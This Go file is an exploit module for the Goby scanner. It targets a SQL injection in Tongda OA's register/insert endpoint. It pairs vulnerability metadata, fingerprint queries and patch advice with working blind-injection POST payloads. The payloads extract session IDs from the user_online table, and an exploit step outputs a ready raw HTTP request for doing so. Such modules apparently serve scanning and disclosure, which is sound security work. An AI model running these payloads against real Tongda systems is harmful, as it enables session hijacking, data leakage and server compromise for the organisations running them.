package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tongda OA register/insert SQL injection vulnerability",
    "Description": "<p>Tongda OA (Office Anywhere network intelligent office system) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., Ltd. It is a comprehensive management office platform formed by combining with Chinese enterprise management practices.</p><p>There are SQL injection vulnerabilities in the register/insert SQL of this system, which may cause data leakage and even server hacking.</p>",
    "Product": "Tongda-OA",
    "Homepage": "http://www.tongda2000.com/",
    "DisclosureDate": "2020-08-23",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "(body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\") || (body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\")",
    "GobyQuery": "(body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\") || (body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\")",
    "Level": "2",
    "Impact": "<p>There are SQL injection vulnerabilities in the register/insert SQL of this system, which may cause data leakage and even server hacking.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please upgrade to the latest version: <a href=\"http://www.tongda2000.com/\">http://www.tongda2000.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/zH13q6xBRc58ggHqfKKi_g"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sqlPoint",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/general/document/index.php/recv/register/insert",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "title)values(\\\"'\\\"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),26,1))>1,1,710)))# =1&_SERVER="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "recv/register",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/general/document/index.php/recv/register/insert",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "title)values(\\\"'\\\"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),27,1))>1,1,710)))# =1&_SERVER="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "var MYOA_JS_SERVER = \"\";",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "通达 OA register/insert SQL 注入漏洞",
            "Product": "TDXK-通达OA",
            "Description": "<p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。</p><p>该系统&nbsp;register/insert SQL 处存在 SQL 注入漏洞，可能造成数据泄漏，甚至服务器被入侵。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至最新版本：<a href=\"http://www.tongda2000.com/\">http://www.tongda2000.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>该系统&nbsp;register/insert SQL 处存在 SQL 注入漏洞，可能造成数据泄漏，甚至服务器被入侵。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Tongda OA register/insert SQL injection vulnerability",
            "Product": "Tongda-OA",
            "Description": "<p>Tongda OA (Office Anywhere network intelligent office system) is a collaborative office automation software independently developed by Beijing Tongda Xinke Technology Co., Ltd. It is a comprehensive management office platform formed by combining with Chinese enterprise management practices.</p><p>There are SQL injection vulnerabilities in the register/insert SQL of this system, which may cause data leakage and even server hacking.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please upgrade to the latest version: <a href=\"http://www.tongda2000.com/\" target=\"_blank\">http://www.tongda2000.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>There are SQL injection vulnerabilities in the register/insert SQL of this system, which may cause data leakage and even server hacking.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10782"
}`

	sendPayloadFlagWyCZLq := func(u *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		requestConfig := httpclient.NewPostRequestConfig("/general/document/index.php/recv/register/insert")
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.Data = sql
		requestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(u, requestConfig)
	}

	vulCheckFlagWyCZLq := func(u *httpclient.FixUrl) bool {
		rsp, err := sendPayloadFlagWyCZLq(u, "title)values(\"'\"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),26,1))>1,1,710)))# =1&_SERVER=")
		if err != nil || rsp == nil {
			return false
		} else if rsp.StatusCode != 302 && !strings.Contains(rsp.HeaderString.String(), "recv/register") {
			return false
		}
		rsp, err = sendPayloadFlagWyCZLq(u, "title)values(\"'\"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),27,1))>1,1,710)))# =1&_SERVER=")
		if err != nil || rsp == nil {
			return false
		} else if rsp.StatusCode == 500 && strings.Contains(rsp.Utf8Html, "var MYOA_JS_SERVER = \"\";") {
			return true
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			return vulCheckFlagWyCZLq(hostinfo)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			success := vulCheckFlagWyCZLq(expResult.HostInfo)
			expResult.Success = success
			if attackType == "sqlPoint" && success {
				output := `POST /general/document/index.php/recv/register/insert HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 123
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

title)values("'"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),1,1))<122,1,710)))# =1&_SERVER=`
				expResult.Output = output
			}
			return expResult
		},
	))
}
